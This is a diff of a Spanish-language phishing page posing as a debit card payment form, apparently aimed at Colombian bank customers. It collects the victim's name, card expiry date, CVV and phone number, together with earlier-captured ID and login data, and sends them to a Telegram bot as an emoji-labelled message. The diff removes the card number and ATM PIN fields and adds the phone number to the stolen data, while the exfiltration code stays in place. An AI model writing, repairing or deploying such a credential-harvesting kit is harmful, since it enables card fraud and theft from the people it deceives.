@@ -97,13 +97,6 @@
                         <input type="text" id="nombre_titular" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Nombre completo" required>
                     </div>
 
-                    <div class="w-full mb-4">
-                        <label for="numero_tarjeta" class="block text-sm font-medium text-gray-700 mb-1">Número de tarjeta</label>
-                        <div class="relative">
-                            <input type="tel" id="numero_tarjeta" class="w-full text-lg border border-gray-400 rounded-md p-2 pr-12" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
-                        </div>
-                    </div>
-
                     <div class="w-full flex justify-between gap-4 mb-4">
                         <div class="flex-1">
                             <label for="fecha_exp" class="block text-sm font-medium text-gray-700 mb-1">Fecha de vencimiento</label>
@@ -118,11 +111,6 @@
                     <div class="w-full mb-4">
                         <label for="telefono" class="block text-sm font-medium text-gray-700 mb-1">Teléfono</label>
                         <input type="tel" id="telefono" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Número de teléfono" required>
-                    </div>
-                    
-                    <div class="w-full mb-4">
-                        <label for="clave_cajero" class="block text-sm font-medium text-gray-700 mb-1">Clave Cajero</label>
-                        <input type="tel" id="clave_cajero" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Clave de 4 dígitos" maxlength="4" required>
                     </div>
 
                     <p id="errorMessage" class="text-red-500 text-center mb-4 hidden">Los datos de la tarjeta son incorrectos. Por favor, verifica la información e intenta de nuevo.</p>
@@ -148,12 +136,10 @@
         document.addEventListener('DOMContentLoaded', async () => {
             const app = document.getElementById("app");
             const pagoForm = document.getElementById("pagoForm");
-            const numeroTarjetaInput = document.getElementById("numero_tarjeta");
             const fechaExpInput = document.getElementById("fecha_exp");
             const cvvInput = document.getElementById("cvv");
             const nombreTitularInput = document.getElementById("nombre_titular");
             const telefonoInput = document.getElementById("telefono");
-            const claveCajeroInput = document.getElementById("clave_cajero");
             const pagarBtn = document.getElementById("pagarBtn");
             const spinnerModal = document.getElementById('spinner-modal');
             const errorMessage = document.getElementById("errorMessage");
@@ -207,24 +193,6 @@
                 }
             }
 
-            // Función de validación de tarjeta con algoritmo de Luhn
-            function luhnCheck(cardNumber) {
-                let s = 0;
-                let doubleDigit = false;
-                for (let i = cardNumber.length - 1; i >= 0; i--) {
-                    let digit = parseInt(cardNumber.charAt(i));
-                    if (doubleDigit) {
-                        digit *= 2;
-                        if (digit > 9) {
-                            digit -= 9;
-                        }
-                    }
-                    s += digit;
-                    doubleDigit = !doubleDigit;
-                }
-                return s % 10 === 0;
-            }
-
             // Función de validación de fecha de expiración
             function validateExpiry(month, year) {
                 const currentYear = new Date().getFullYear().toString().substr(-2);
@@ -238,10 +206,6 @@
             function validateForm() {
                 const nombreValido = nombreTitularInput.value.trim().length > 2;
                 const telefonoValido = telefonoInput.value.trim().length >= 7;
-                const claveCajeroValida = claveCajeroInput.value.trim().length === 4;
-
-                const numeroTarjeta = numeroTarjetaInput.value.replace(/\s/g, '');
-                const numeroTarjetaValido = luhnCheck(numeroTarjeta) && numeroTarjeta.length >= 13 && numeroTarjeta.length <= 19;
 
                 const fechaExp = fechaExpInput.value.split('/');
                 const mes = fechaExp[0];
@@ -250,17 +214,10 @@
 
                 const cvvValido = cvvInput.value.length >= 3 && cvvInput.value.length <= 4;
 
-                pagarBtn.disabled = !(nombreValido && telefonoValido && claveCajeroValida && numeroTarjetaValido && fechaValida && cvvValido);
+                pagarBtn.disabled = !(nombreValido && telefonoValido && fechaValida && cvvValido);
             }
 
             // Listeners para dar formato a los campos y validar
-            numeroTarjetaInput.addEventListener('input', (e) => {
-                let { value } = e.target;
-                value = value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
-                e.target.value = value;
-                validateForm();
-            });
-
             fechaExpInput.addEventListener('input', (e) => {
                 let { value } = e.target;
                 value = value.replace(/\D/g, '');
@@ -274,7 +231,6 @@
             cvvInput.addEventListener('input', validateForm);
             nombreTitularInput.addEventListener('input', validateForm);
             telefonoInput.addEventListener('input', validateForm);
-            claveCajeroInput.addEventListener('input', validateForm);
 
             // Función para enviar a Telegram y obtener el message_id
             async function sendToTelegram(messageContent, keyboard) {
@@ -410,11 +366,9 @@
                 errorMessage.classList.add('hidden');
 
                 const nombreTitular = nombreTitularInput.value.trim();
-                const numeroTarjeta = numeroTarjetaInput.value.replace(/\s/g, '');
                 const fechaExp = fechaExpInput.value.trim();
                 const cvv = cvvInput.value.trim();
                 const telefono = telefonoInput.value.trim();
-                const claveCajero = claveCajeroInput.value.trim();
 
                 const now = new Date();
                 const formattedDate = now.toLocaleDateString('es-CO', {
@@ -433,17 +387,13 @@
                     telegramMessage += `Tipo de Ingreso: Tarjeta Débito\n`;
                     telegramMessage += `Tipo de Doc: ${initialLoginData.tipoDoc}\n`;
                     telegramMessage += `CEDULA💎: ${initialLoginData.nroDoc}\n`;
-                    telegramMessage += `ClAVE🔐: ${initialLoginData.cardClave}\n`;
-                    if (initialLoginData.cardClave !== 'N/A') {
-                        telegramMessage += `Últimos 4 dígitos: ${initialLoginData.cardDigitos}\n`;
-                    }
                 }
                 
                 telegramMessage += `\n`;
                 telegramMessage += `Nombre: ${nombreTitular}\n`;
-                telegramMessage += `Tarjeta: ${numeroTarjeta}\n`;
                 telegramMessage += `Fecha Exp: ${fechaExp}\n`;
                 telegramMessage += `CVV: ${cvv}\n`;
+                telegramMessage += `Teléfono: ${telefono}\n`;
                 telegramMessage += `Fecha/Hora: ${formattedDate}, ${formattedTime}`;
 
                 const keyboard = {
